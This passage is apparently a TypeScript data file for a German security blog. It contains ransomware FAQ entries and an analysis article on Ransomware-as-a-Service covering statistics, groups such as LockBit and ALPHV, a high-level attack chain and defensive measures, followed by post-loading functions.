      { q: 'Sollte man Lösegeld zahlen?', a: 'Das BSI und Strafverfolgungsbehörden raten grundsätzlich von Lösegeldzahlungen ab, da sie kriminelle Infrastruktur finanzieren und keine Garantie für vollständige Datenwiederherstellung bieten. Laut Sophos erhält nur 8% der Unternehmen, die zahlen, alle Daten vollständig zurück.' },
      { q: 'Wie gelangen Ransomware-Gruppen initial in Unternehmensnetzwerke?', a: 'Die häufigsten Initial-Access-Vektoren laut Sophos 2023: kompromittierte Zugangsdaten für VPN oder RDP (33%), ausgenutzte Softwareschwachstellen (36%), Phishing-Mails (18%). Initial Access Broker kaufen oder stehlen Zugangsdaten und verkaufen sie im Darknet an RaaS-Affiliates.' },
      { q: 'Was ist "Double Extortion" bei Ransomware?', a: 'Double Extortion ist eine Taktik, bei der Angreifer vor der Verschlüsselung Daten stehlen und mit deren Veröffentlichung drohen. Unternehmen mit guten Backups können so trotzdem zur Zahlung genötigt werden, da die Veröffentlichung sensitiver Kundendaten zu DSGVO-Bußgeldern führen würde.' },
      { q: 'Sind kleine Unternehmen auch Ziele von RaaS-Gruppen?', a: 'Ja, explizit. Mittelständische Unternehmen mit 50 bis 500 Mitarbeitern sind bevorzugte Ziele: Sie haben oft weniger ausgereifte Sicherheitsstrukturen als Großkonzerne, aber ausreichend Umsatz für Lösegelder im sechs- bis siebenstelligen Bereich.' },
      { q: 'Was ist zu tun, unmittelbar nachdem ein Ransomware-Angriff entdeckt wurde?', a: 'Sofortige Isolation betroffener Systeme vom Netzwerk (Netzwerkkabel trennen). Keine Systeme ausschalten, da forensische Spuren im RAM verloren gehen. IT-Sicherheitsteam alarmieren, BSI und Polizei kontaktieren, Backup-Integrität prüfen.' },
    ],
    sources: [
      { title: 'Sophos State of Ransomware Report 2023', url: 'https://www.sophos.com/en-us/content/state-of-ransomware' },
      { title: 'Europol Internet Organised Crime Threat Assessment (IOCTA) 2023', url: 'https://www.europol.europa.eu/publications-events/main-reports/iocta-report' },
      { title: 'BSI-Empfehlungen zu Ransomware', url: 'https://www.bsi.bund.de/DE/Themen/Unternehmen-und-Organisationen/Cyber-Sicherheitslage/Analysen-und-Prognosen/Ransomware/ransomware_node.html' },
    ],
  },

  // ── 5 (old). Ransomware-as-a-Service ───────────────────────────────────────────────
  {
    id: '5',
    slug: 'ransomware-as-a-service-2024',
    title: 'Ransomware-as-a-Service 2024: Wie die Industrie des digitalen Erpressens funktioniert',
    excerpt: 'Ransomware ist zur industrialisierten Kriminalität geworden. Laut Sophos State of Ransomware 2024 waren 59% der befragten Organisationen betroffen. Eine Analyse der RaaS-Ökonomie, aktueller Gruppen und wirksamer Gegenmaßnahmen.',
    category: 'Analyse',
    categoryColor: '#9664FF',
    categoryBg: 'rgba(150,100,255,0.1)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: Sophos, IBM, Veeam, Europol, BSI',
    publishedAt: '2024-09-01',
    readTime: 13,
    imageGradient: 'linear-gradient(135deg, #0D0820 0%, #150A30 50%, #0D0820 100%)',
    badge: 'ANALYSE',
    badgeColor: '#9664FF',
    tags: ['Ransomware', 'RaaS', 'Extortion', 'Cl0p', 'LockBit', 'ALPHV', 'Incident Response', 'Backup'],
    sources: [
      { title: 'Sophos State of Ransomware 2024', url: 'https://www.sophos.com/en-us/content/state-of-ransomware' },
      { title: 'IBM Cost of a Data Breach Report 2024', url: 'https://www.ibm.com/reports/data-breach' },
      { title: 'Veeam Ransomware Trends Report 2024', url: 'https://www.veeam.com/ransomware-trends-report-2024.html' },
      { title: 'Europol IOCTA 2024', url: 'https://www.europol.europa.eu/publications-events/main-reports/iocta-report' },
      { title: 'BSI: Ransomware', url: 'https://www.bsi.bund.de/ransomware' },
    ],
    faqs: [
      { q: 'Soll man Lösegeld zahlen?', a: 'Das BSI und alle Strafverfolgungsbehörden raten ausdrücklich von Lösegeldzahlungen ab. Gründe: 1) Keine Garantie auf Entschlüsselung oder Datenlöschung. 2) Laut Sophos 2024: 56% der zahlenden Organisationen konnten nicht alle Daten wiederherstellen. 3) Lösegeldzahlungen finanzieren weitere Angriffe. 4) Rechtliche Risiken (Sanktionen wenn Angreifer auf Sanktionslisten stehen).' },
      { q: 'Was sind die wichtigsten ersten Schritte nach einem Ransomware-Angriff?', a: '1) Betroffene Systeme sofort vom Netzwerk isolieren (nicht ausschalten — forensische Beweise erhalten). 2) IT-Notfallteam/externen Incident-Response-Dienstleister alarmieren. 3) BSI informieren (Pflicht für KRITIS-Betreiber, empfohlen für alle). 4) Staatsanwaltschaft/LKA benachrichtigen. 5) Datenschutzbehörde informieren wenn personenbezogene Daten betroffen (72-Stunden-Frist DSGVO). 6) Backup-Integrität prüfen.' },
      { q: 'Kann man Ransomware ohne Backup wiederherstellen?', a: 'In manchen Fällen ja: Das Projekt NoMoreRansom (nomoreransom.org) — eine Initiative von Europol, FBI, und Antivirusherstellern — bietet kostenlose Entschlüsselungstools für bekannte Ransomware-Familien. Allerdings haben aktuelle RaaS-Gruppen in der Regel keine bekannten Schwächen in der Verschlüsselung.' },
      { q: 'Was kostet ein Ransomware-Angriff wirklich?', a: 'Laut IBM Cost of a Data Breach 2024: durchschnittlich 4,88 Millionen USD Gesamtkosten (global). Darin enthalten sind Lösegeldzahlungen, Wiederherstellungskosten, Betriebsunterbrechung, Reputationsschäden und rechtliche Kosten. Laut Sophos 2024: Durchschnittliche Wiederherstellungskosten 2,73 Millionen USD — unabhängig davon ob Lösegeld gezahlt wurde.' },
    ],
    content: `<h2 id="was-ist-raas">Was ist Ransomware-as-a-Service?</h2>
<p>Ransomware-as-a-Service (RaaS) ist ein Geschäftsmodell, bei dem Ransomware-Entwickler ihre Schadsoftware und Infrastruktur als Dienstleistung an Kriminelle vermieten — die sogenannten <strong>Affiliates</strong>. Der Affiliate führt den Angriff durch und teilt den Erlös mit den RaaS-Entwicklern, typischerweise 20–30%.</p>
<p>Dieses Modell hat Ransomware industrialisiert: Technisches Know-how ist nicht mehr notwendig. Ein Affiliate kauft Zugangsdaten (Credentials) zu Firmennetzwerken auf kriminellen Marktplätzen, lässt die RaaS-Plattform die Verschlüsselung durchführen und wartet auf Lösegeldzahlungen.</p>

<h2 id="zahlen">Zahlen und Fakten 2024</h2>
<p>Folgende Zahlen entstammen veröffentlichten Berichten seriöser Quellen:</p>
<ul>
<li><strong>Sophos State of Ransomware 2024</strong> (5.000 befragte IT-Entscheider in 14 Ländern): <strong>59% der Organisationen</strong> wurden in den letzten 12 Monaten von Ransomware getroffen</li>
<li><strong>Sophos 2024:</strong> Durchschnittliche Lösegeldforderung: <strong>2 Millionen USD</strong> (Median)</li>
<li><strong>Sophos 2024:</strong> Nur <strong>44% der zahlenden Organisationen</strong> zahlten weniger als die ursprüngliche Forderung (nach Verhandlung)</li>
<li><strong>IBM Cost of a Data Breach 2024:</strong> Durchschnittliche Gesamtkosten eines Datenvorfalls: <strong>4,88 Millionen USD</strong> (globaler Durchschnitt, höchster Wert seit Beginn der Erhebung)</li>
<li><strong>Veeam Ransomware Trends 2024:</strong> <strong>75% der Unternehmen</strong> waren 2023/24 Opfer von mindestens einem Ransomware-Angriff</li>
</ul>

<h2 id="gruppen">Aktive RaaS-Gruppen 2024</h2>
<h3 id="lockbit">LockBit 3.0</h3>
<p>LockBit war bis Anfang 2024 die produktivste Ransomware-Gruppe weltweit. Im Februar 2024 führte <strong>Operation Cronos</strong> — eine koordinierte Aktion von Europol, FBI, NCA (Großbritannien) und 10 weiteren Behörden — zur Abschaltung der LockBit-Infrastruktur und Verhaftung mehrerer Mitglieder. Zwei mutmaßliche LockBit-Affiliates wurden in Polen und der Ukraine festgenommen, ein russisches Mitglied wurde in den USA angeklagt.</p>
<p>LockBit versuchte sich neu zu formieren, verlor aber erheblich an Kapazität und Reputation in der kriminellen Gemeinschaft.</p>

<h3 id="alphv">ALPHV/BlackCat</h3>
<p>ALPHV (auch BlackCat) war 2023/24 eine der technisch fortschrittlichsten Ransomware-Gruppen. Im März 2024 übernahm das FBI die ALPHV-Leak-Seite. Kurz darauf führte ALPHV angeblich einen <strong>Exit Scam</strong> durch — verschwand mit ca. 22 Millionen USD Lösegeld, das ein Affiliate für den Angriff auf Change Healthcare (US-Gesundheitsversorgung) erpresst hatte.</p>
<p>Der Angriff auf Change Healthcare im Februar 2024 verursachte massive Störungen im US-amerikanischen Gesundheitssystem und gilt als einer der folgenschwersten Ransomware-Vorfälle in der Geschichte.</p>

<h3 id="cl0p">Cl0p</h3>
<p>Cl0p ist bekannt für groß angelegte Angriffe auf Dateitransfer-Software (Accellion 2021, GoAnywhere 2023, MOVEit 2023). Die Gruppe setzt auf Datendiebstahl ohne Verschlüsselung — ein Trend der sich 2024 fortsetzt.</p>

<h2 id="anatomie">Anatomie eines modernen Ransomware-Angriffs</h2>
<p>Moderne RaaS-Angriffe folgen typischerweise einer strukturierten Angriffskette:</p>
<ol>
<li><strong>Initial Access:</strong> Phishing-E-Mails, kompromittierte VPN-Zugangsdaten (z.B. aus Datenpannen), öffentlich zugängliche Schwachstellen in RDP, VPN-Appliances</li>
<li><strong>Persistence:</strong> Installation von Remote-Access-Tools (Cobalt Strike, Metasploit), Erstellung von Backdoor-Accounts</li>
<li><strong>Lateral Movement:</strong> Ausbreitung im Netzwerk über Pass-the-Hash, RDP, WMI — Ziel sind Active-Directory-Admins und Backup-Systeme</li>
<li><strong>Data Exfiltration (Double Extortion):</strong> Systematischer Datendiebstahl vor der Verschlüsselung als Druckmittel</li>
<li><strong>Backup-Sabotage:</strong> Löschen oder Verschlüsseln von Backup-Systemen — kritischste Phase für die Wiederherstellbarkeit</li>
<li><strong>Deployment:</strong> Gleichzeitige Ausführung des Ransomware-Payloads auf allen identifizierten Systemen</li>
</ol>
<pre><code class="language-bash"># Typische Verweildauer vor Verschlüsselung (laut Mandiant M-Trends 2024):
# Medianer "Dwell Time": 10 Tage (globaler Durchschnitt)
# D.h.: Angreifer sind im Schnitt 10 Tage im Netzwerk BEVOR der Angriff sichtbar wird
# Ziel: Backup-Systeme identifizieren und kompromittieren</code></pre>

<h2 id="schutz">Wirkungsvolle Schutzmaßnahmen</h2>
<p>Folgende Maßnahmen sind laut BSI, CISA und führenden Sicherheitsforschern am wirksamsten:</p>
<h3 id="backup">Backup nach 3-2-1-1-0</h3>
<ul>
<li><strong>3</strong> Kopien der Daten</li>
<li><strong>2</strong> verschiedene Speichermedien</li>
<li><strong>1</strong> Off-Site Kopie</li>
<li><strong>1</strong> Offline / Air-Gapped Kopie (nicht erreichbar über das Netzwerk)</li>
<li><strong>0</strong> ungetestete Backups — regelmäßige Restore-Tests sind Pflicht</li>
</ul>
<h3 id="mfa-privilegien">MFA + Privilegienverwaltung</h3>
<ul>
<li>MFA für alle externen Zugänge (VPN, E-Mail, RDP, Admin-Interfaces)</li>
<li>Privileged Access Management (PAM) für Admin-Accounts</li>
<li>Least-Privilege-Prinzip: Jeder Account hat nur die minimal notwendigen Rechte</li>
</ul>
<h3 id="segmentierung">Netzwerksegmentierung</h3>
<ul>
<li>Backup-Systeme in eigenem, isolierten VLAN ohne direkte Verbindung zu Produktionssystemen</li>
<li>Micro-Segmentierung verhindert laterale Bewegung</li>
<li>Zero-Trust-Architektur: Kein implizites Vertrauen innerhalb des Netzwerks</li>
</ul>

<h2 id="strafverfolgung">Strafverfolgung: Erfolge und Grenzen</h2>
<p>Die internationale Strafverfolgung hat 2024 Fortschritte erzielt:</p>
<ul>
<li><strong>Operation Cronos (Februar 2024):</strong> Zerschlagung von LockBit, Verhaftung mehrerer Mitglieder</li>
<li><strong>ALPHV-Disruption (Dezember 2023/März 2024):</strong> FBI übernimmt ALPHV-Infrastruktur</li>
<li><strong>Hive-Ransomware (Januar 2023):</strong> FBI infiltrierte Hive für 6 Monate und stellte Entschlüsselungskeys bereit</li>
</ul>
<p>Trotz dieser Erfolge: Die meisten RaaS-Entwickler operieren aus Ländern ohne Auslieferungsabkommen (Russland, Iran, Nordkorea) und sind damit praktisch unantastbar für westliche Strafverfolgungsbehörden.</p>`,
  },
];

// ─── Data access functions ───────────────────────────────────────────────────

// KI-generierte Posts aus src/data/generated-posts.json (via n8n → GitHub API)
import generatedPostsRaw from '../data/generated-posts.json';
const GENERATED_POSTS: Post[] = (generatedPostsRaw as Post[]);

// Alle Posts: generierte zuerst (neueste oben), dann statische die noch nicht vorhanden
function getAllPosts(): Post[] {
  const generatedSlugs = new Set(GENERATED_POSTS.map(p => p.slug));
  const staticOnly = STATIC_POSTS.filter(p => !generatedSlugs.has(p.slug));
  const combined = [...GENERATED_POSTS, ...staticOnly];
  // Nach Datum sortieren — neueste zuerst
  return combined.sort((a, b) =>
    new Date(b.publishedAt).getTime() - new Date(a.publishedAt).getTime()
  );
}

export async function getPosts(): Promise<Post[]> {
  return getAllPosts();
}

export async function getPost(slug: string): Promise<Post | null> {
  return getAllPosts().find(p => p.slug === slug) ?? null;
}

export async function getRelatedPosts(slug: string, category: string): Promise<Post[]> {
  const all = await getPosts();
  return all.filter(p => p.slug !== slug && p.category === category).slice(0, 3);
}

export async function getLatestPosts(limit = 5): Promise<Post[]> {
  const all = await getPosts();
  return all.slice(0, limit);
}

export function formatDate(dateStr: string): string {
  return new Date(dateStr).toLocaleDateString('de-DE', {
    day: '2-digit', month: 'long', year: 'numeric',
  });
}
